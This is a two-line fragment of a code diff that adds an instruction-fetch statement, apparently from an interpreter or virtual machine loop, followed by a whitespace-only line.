+										Inst = Instr[VIP];
+			
